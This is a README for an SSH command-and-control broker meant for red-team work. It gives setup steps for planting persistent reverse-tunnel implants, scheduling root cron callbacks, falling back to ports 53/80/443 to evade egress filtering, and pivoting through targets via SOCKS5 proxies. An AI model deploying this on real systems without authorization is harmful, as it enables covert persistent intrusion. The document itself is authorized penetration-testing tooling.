# ssh-c2-broker

A lightweight SSH-based Command & Control (C2) broker for red team operations and authorized penetration testing. Implanted clients establish persistent reverse SSH tunnels back to a central relay server; operators connect through the relay to reach any registered device, with an automatic SOCKS5 proxy per target.

> **⚠️ Authorized use only.** Deploy only against systems you own or have explicit written permission to test.

---

## Architecture
```
┌──────────────┐   Reverse SSH tunnel    ┌──────────────────┐       SSH        ┌──────────────┐
│   Client     │ ──────────────────────► │   Broker Server  │ ◄─────────────── │   Operator   │
│  (implant)   │   ports 22/53/80/443    │  (relay + DB)    │                  │              │
└──────────────┘                         └──────────────────┘                  └──────────────┘
                ◄══════════════════════════════════════════════════════════════
                                              SSH Tunnel 
```

1. **Client** — runs on a target machine; phones home via `autossh`, registers itself with the server, and maintains a persistent reverse tunnel on a unique assigned port.
2. **Server** — relay node running SSH on ports 22, 53, 80, and 443. Maintains a device database and exposes helper scripts to the restricted `c2` user.
3. **Operator** — connects to the broker, selects a registered device, maps its port locally, and drops into an interactive shell with a per-device SOCKS5 proxy running +10000 ports above port number.

---

## Components

### Server

| File | Purpose |
|---|---|
| `install.sh` | Creates the `c2` relay user (`rbash`), installs dependencies, and deploys server scripts. |
| `sshd_config` | Hardened OpenSSH config listening on ports **22, 53, 80, 443**; key-auth only, no root login. |
| `configfiles/registerc2.sh` | Called by clients on first connect; assigns a unique persistent port and records the device in `c2database.txt`. |
| `configfiles/active_c2.sh` | Checks whether a specific port tunnel is live; used by the client for sanity checks. |
| `configfiles/active_c2_tagged.sh` | Lists all active tunnels with hostname and tag; used by the operator menu. |
| `configfiles/c2database.txt` | CSV registry: `port,hostname,tag`. |
| `configfiles/c2untagged.txt` | Staging area for newly registered clients pending a tag. |
| `configfiles/lastc2.txt` | Tracks the last assigned port number for auto-increment. |
| `configfiles/startport.txt` | Starting port for the assigned range (default: `30000`). |

### Client

| File | Purpose |
|---|---|
| `install.sh` | Installs `autossh` + cron, registers the device with the server, and schedules `callback.sh` every 2 minutes. |
| `callback.sh` | Heartbeat script: verifies the tunnel, scans fallback ports on failure, kills stale connections, and restarts `autossh`. |
| `c2_ip.txt` | Broker server IP address. |
| `c2_port.txt` | Last-known working server port. |
| `c2_ports.txt` | All server ports to try (22, 53, 80, 443). |
| `c2_tag.txt` | Operator-defined label for this implant. |

### Operator

| File | Purpose |
|---|---|
| `c2connect.sh` | Fetches the active device list from the broker, maps the selected device's port to localhost, starts a SOCKS5 proxy, and opens an interactive SSH shell. |


---

## Setup

### Prerequisites

- Debian/Ubuntu-based Linux on both server and client nodes
- `autossh` on client nodes (installed by `install.sh`)
- `bc`, `net-tools` on the server (installed by `install.sh`)

---

### 1. Server

```bash
# Clone/copy the repo to the server
git clone https://github.com/DirectDefense/ssh-c2-broker.git /opt/ssh-c2-broker

# Run the server installer
cd /opt/ssh-c2-broker/Server
bash install.sh

#ensure that you have public key authentication configured via authorized keys or Signed Certs
#https://github.com/JRodriguez556/WWHF-Scaling-SSH-Auth-with-Signed-Certs-and-CAs
```

The installer will:
- Optionally replace `/etc/ssh/sshd_config` with the custom version (backs up the original)
- Create the restricted `c2` user with a password you set
- Copy all server scripts to `/usr/bin/` and data files to `/home/c2/`
- Restart the SSH service

The installer will not:
- Configure any authentication material. Configure c2 user auth after installing the server 

---

### 2. Client

```bash
# Deploy the repo to the target
git clone https://github.com/DirectDefense/ssh-c2-broker /opt/ssh-c2-broker   # or scp/rsync

# Set key path in /opt/ssh-c2-broker/Client/ install.sh & callback.sh OR Copy the c2 private key to /root/
cp /path/to/private_key /root/id_ed25519
chmod 600 /root/id_ed25519

# Set the broker server IP
echo "1.2.3.4" > /opt/ssh-c2-broker/Client/c2_ip.txt

# Set a tag for this implant
echo "target-name" > /opt/ssh-c2-broker/Client/c2_tag.txt

# Run the client installer (prompts if IP/tag are still at defaults)
cd /opt/ssh-c2-broker/Client
bash install.sh
```

The installer:
- Installs `autossh` and `cron`
- Registers the device with the server (receives a persistent port assignment)
- Adds a cron job: `*/2 * * * * root /opt/ssh-c2-broker/Client/callback.sh`
- Fires the first callback immediately

The installer will not:
- Configure any authentication material
 - ensure you have some sort of keys configured on the client.
 - configure auth prior to installing the client

---

### 3. Operator

Edit `Operator/c2connect.sh` and set:

```bash
c2_server_key="~/.ssh/your_server_key"   # key for the broker's c2 user
c2_client_key="~/.ssh/your_client_key"   # key for the implant's user
ip="1.2.3.4"                             # broker server IP
c2serverusername="c2"                    #c2 server username
c2clientusername="c2"                    #c2 client username
```

Then connect:

```bash
# Interactive device picker
bash Operator/c2connect.sh

# Direct connect to a known port
bash Operator/c2connect.sh 30000
```

The script:
1. Queries `active_c2_tagged.sh` on the broker for the live device list
2. Maps the selected device's port to `localhost:<port>` via an SSH local forward
3. Launches a SOCKS5 proxy on `localhost:<port+10000>` through the device
4. Drops into an interactive SSH shell on the target
5. Cleans up both tunnels on exit

---

## How Tunnels Work
```
Client                          Broker Server                    Operator
  |                                  |                                |
  |  [1] autossh (reverse tunnel)    |                                |
  |      -R 300N:localhost:22        |                                |
  |      -D 127.0.0.1:9050           |                                |
  |─────────────────────────────────►|  *:300N  (→ client:22)         |
  |                                  |                                |
  |                                  |   [2] ssh (local port-forward) |
  |                                  |    -L 300N:localhost:300N      |
  |                                  |◄───────────────────────────────|
  |                                  |                                |
  |◄═════════════════════════════════╪══════ [3] SSH shell ═══════════|
  |                                  |    ssh -p 300N localhost       |
  |                                  |                                |
  |                             [4] Chain                             |
  |               localhost:22 ◄ broker:300N ◄ localhost:300N         |
  |               localhost:22 ◄ broker:300N ◄ -D localhost:400N -D   |
  |                                  |                                |

  300N = dynamically assigned port per client (e.g., 3001, 3002, ...)
```

- Each client is assigned a unique port (starting at 30000) stored server-side.
- The reverse tunnel (`-R`) makes the client's SSH port available on the broker.
- The operator maps that port locally (`-L`) then SSH's directly to the device.
- The SOCKS5 proxy (`-D :9050`) on the client enables proxied traffic (via proxychains) to the Internet.
- The SOCKS5 proxy (`-D localhost:400N`) on the operator box enables proxied traffic to the client machine network. 

---

## Callback Resilience

`callback.sh` runs every 2 minutes and:

1. Tests the last-known working port (with a 30-second retry on failure)
2. If that fails, scans all ports in `c2_ports.txt` (22, 53, 80, 443) for a live one
3. Performs a sanity check — verifies the broker sees this hostname via `active_c2.sh`
4. Kills stale `autossh` processes and rebuilds the tunnel if anything is wrong

---

## Configuration Reference

| File | Default | Description |
|---|---|---|
| `Client/c2_ip.txt` | `127.0.0.1` | Broker IP — **must be changed** |
| `Client/c2_tag.txt` | `default` | Implant label — prompted during install if unchanged |
| `Client/c2_port.txt` | *(first working port)* | Last-used server port; updated on reconnect |
| `Client/c2_ports.txt` | 22, 53, 80, 443 | Ports to try in order on reconnect |
| `Server/configfiles/startport.txt` | `30000` | First port in the persistent-port range |

---

## License

See [LICENSE](LICENSE).
